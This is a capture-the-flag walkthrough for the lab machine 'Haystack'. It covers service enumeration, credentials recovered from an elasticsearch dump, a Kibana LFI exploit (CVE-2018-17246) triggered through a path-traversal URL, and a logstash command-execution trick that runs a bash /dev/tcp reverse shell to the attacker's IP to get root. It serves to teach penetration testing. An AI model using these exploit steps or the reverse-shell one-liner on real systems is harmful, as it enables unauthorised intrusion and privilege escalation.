<center><h1>Haystack</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>

Start off with an Nmap scan

```
# Nmap 7.70 scan initiated Tue Jul  2 13:01:19 2019 as: nmap -sV -sC -T4 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.21s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: 502 Bad Gateway

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  2 13:01:49 2019 -- 1 IP address (1 host up) scanned in 30.16 seconds
```
A few ports open but it looks like there are two <b>http</b> ports. Navigating to <b>http://10.10.10.115</b> I am greeted with only a picture of a needle.

<center><img src="/htb/haystack/needle.png"></center>
<br>
If I download the image and look at it with <b>strings</b> I find a <b>base64</b> encoded string at the bottom.
```
# wget http://10.10.10.115/needle.jpg
--2019-09-21 22:32:17--  http://10.10.10.115/needle.jpg
Connecting to 10.10.10.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 182982 (179K) [image/jpeg]
Saving to: ‘needle.jpg’

needle.jpg                                100%[===================================================================================>] 178.69K   709KB/s    in 0.3s    

2019-09-21 22:32:19 (709 KB/s) - ‘needle.jpg’ saved [182982/182982]
```
<b>Strings</b>
```
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```
And if we <b>base64</b> decode that string we get a message.
```
# echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" | base64 -d
la aguja en el pajar es "clave"
```
The message translates to <b>The needles in the haystack is "key"</b>.

For now I can't do anything with that information so I now check out port 9200. First thing I see is some json data refering to <b>elasticsearch v6.4.2</b>
```
name	"iQEYHgS"
cluster_name	"elasticsearch"
cluster_uuid	"pjrX7V_gSFmJY-DxP4tCQg"
version
number	"6.4.2"
build_flavor	"default"
build_type	"rpm"
build_hash	"04711c2"
build_date	"2018-09-26T13:34:09.098244Z"
build_snapshot	false
lucene_version	"7.4.0"
minimum_wire_compatibility_version	"5.6.0"
minimum_index_compatibility_version	"5.0.0"
tagline	"You Know, for Search"
```
I have no idea what <b>elasticsearch</b> is so I do some reading on it. Turns out you can interact with it and dump all of the <b>json</b> data that is stored. To do this I am going to use *[this](https://github.com/taskrabbit/elasticsearch-dump)*. After downloading and installing everything I dump all the data
```
./elasticdump --input=http://10.10.10.115:9200 --output=/root/Downloads/dump --type=data
Sun, 22 Sep 2019 03:15:18 GMT | starting dump
Sun, 22 Sep 2019 03:15:19 GMT | got 100 objects from source elasticsearch (offset: 0)
Sun, 22 Sep 2019 03:15:19 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:19 GMT | got 100 objects from source elasticsearch (offset: 100)
Sun, 22 Sep 2019 03:15:19 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:19 GMT | got 100 objects from source elasticsearch (offset: 200)
Sun, 22 Sep 2019 03:15:19 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:19 GMT | got 100 objects from source elasticsearch (offset: 300)
Sun, 22 Sep 2019 03:15:19 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:20 GMT | got 100 objects from source elasticsearch (offset: 400)
Sun, 22 Sep 2019 03:15:20 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:20 GMT | got 100 objects from source elasticsearch (offset: 500)
Sun, 22 Sep 2019 03:15:20 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:24 GMT | got 100 objects from source elasticsearch (offset: 600)
Sun, 22 Sep 2019 03:15:24 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:24 GMT | got 100 objects from source elasticsearch (offset: 700)
Sun, 22 Sep 2019 03:15:24 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:24 GMT | got 100 objects from source elasticsearch (offset: 800)
Sun, 22 Sep 2019 03:15:24 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:25 GMT | got 100 objects from source elasticsearch (offset: 900)
Sun, 22 Sep 2019 03:15:25 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:25 GMT | got 100 objects from source elasticsearch (offset: 1000)
Sun, 22 Sep 2019 03:15:25 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:29 GMT | got 100 objects from source elasticsearch (offset: 1100)
Sun, 22 Sep 2019 03:15:29 GMT | sent 100 objects to destination file, wrote 100
Sun, 22 Sep 2019 03:15:29 GMT | got 54 objects from source elasticsearch (offset: 1200)
Sun, 22 Sep 2019 03:15:29 GMT | sent 54 objects to destination file, wrote 54
Sun, 22 Sep 2019 03:15:29 GMT | got 0 objects from source elasticsearch (offset: 1254)
Sun, 22 Sep 2019 03:15:29 GMT | Total Writes: 1254
Sun, 22 Sep 2019 03:15:29 GMT | dump complete
```
Now we can use the message from the picture to help us find credentials. Just <b>grep</b> for the word <b>clave</b>.
```
# grep clave dump
{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}
{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}
```
So there are two different credentials but they are both encoded in <b>base64</b> so we just need to decode it
```
# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security

# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
```
We can now use the username <b>security</b> and password <b>spanish.is.key</b> to ssh in.
```
# ssh security@10.10.10.115
security@10.10.10.115's password:
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$
```
From here you can read the <b>user.txt</b> file.
```
[security@haystack ~]$ ls
user.txt
[security@haystack ~]$ cat user.txt
04d18bc79dac1d4***************
```
Next step is to run an enumeration script. Normally I would run <b>LinEnum.sh</b> but since I know the password to the user I am going to use *[this script](https://github.com/diego-treitos/linux-smart-enumeration)*.
```
# scp lse.sh security@10.10.10.115:/home/security
security@10.10.10.115's password:
lse.sh                                                                                             100%   30KB 226.2KB/s   00:00    
```
Two things we see is that there is another user <b>kibana</b> and that there is a service running on <b>127.0.0.1:5601</b>. If you google the port number you will see that kibana runs on that port. To make my life easier I am going to port forward the Kibana service from the box to my own machine using SSH
```
# ssh -L 5601:127.0.0.1:5601 security@10.10.10.115
security@10.10.10.115's password:
Last login: Sun Sep 22 00:34:23 2019 from 10.10.14.21
[security@haystack ~]$
```
Now if we navigate to <b>127.0.0.1:5601</b> on our local machine then you should have access to the kibana service.

<center><img src="/htb/haystack/kibana.png"></center>
<br>

Next I googled for any exploits relating to Kibana and found *[this](https://github.com/mpgn/CVE-2018-17246)*. It tells us that there is an LFI vulnerability. First I copy my reverse shell over to the box using <b>scp</b> once again. Then I set up my <b>netcat</b> listener and lastly triggered the LFI.
```
http://localhost:5601/api/console/api_server?apis=../../../../../../.../../../../tmp/myshell.js
```
If I look at my <b>netcat</b> listener it shows a connecton and if I type <b>whoami</b> it shows that I am not the user <b>kibana</b>
```
# nc -lvnp 10000
listening on [any] 10000 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.115] 58044

whoami
kibana
```
Now for root. I decided to run <b>LinEnum.sh</b> to do some enumeration since we are now a different user. Looking at the running processes you should see this very long process running.
```
root       6349  0.5 13.5 2717068 523432 ?      SNsl sep21   6:39 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFract
ion=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOut
OfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-co
re/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annota
tions-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr
/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars
/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar
:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash
-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:
/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-cor
e/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.cor
e.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.c
ore.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.re
sources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1
.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-
3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.j
ar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/l
ogstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
```
No need to read all of it, the important part is the <b>logstash</b>. We can see from the process that there are two logstash folders. One in <b>/etc/logstash</b> and the other in <b>/usr/share/logstash</b>. If you look in the <b>/etc/logstash</b> directory you will find a <b>conf.d</b> folder with some configuration files.
```
bash-4.2$ ls conf.d/
filter.conf  input.conf  output.conf
```
Reading each file shows us that it looks for a file in <b>/opt/kibana</b> that starts with <b>logstash_</b> and then reads the file and executes it if it matches the filters criteria.
```
$ cat filter.conf
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}

$ cat input.conf
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}

$ cat output.conf
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```
I used *[this](https://grokdebug.herokuapp.com/)* website to test my command. Only took a few tries to get it right

<center><img src="/htb/haystack/grok.png"></center>
<br>
Now lets add that command into a file name <b>logstash_shell</b> and make it executable
```
# echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.21/10000 0>&1" > logstash_shell

# chmod +x logstash_shell
```
Make sure you have your <b>nc</b> listener ready and I decided to include the <b>-k</b> option since the shell sometimes connects/disconnects multiple times so I didn't want the listener to have the same problem. Eventually you should have a root shell spawn.
```
# nc -lkvnp 10000                                                                                                                           
Ncat: Version 7.80 ( https://nmap.org/ncat )                                                                                                                          
Ncat: Listening on :::10000                                                                                                                                           
Ncat: Listening on 0.0.0.0:10000                                                                                                                                      
Ncat: Connection from 10.10.10.115.
Ncat: Connection from 10.10.10.115:54928.
bash: no hay control de trabajos en este shell
[root@haystack /]#
```
Now you can read the the root flag
```
[root@haystack /]# cat /root/root.txt                                                   
3f5f727c38d9f70****************
```
<br><br><br>
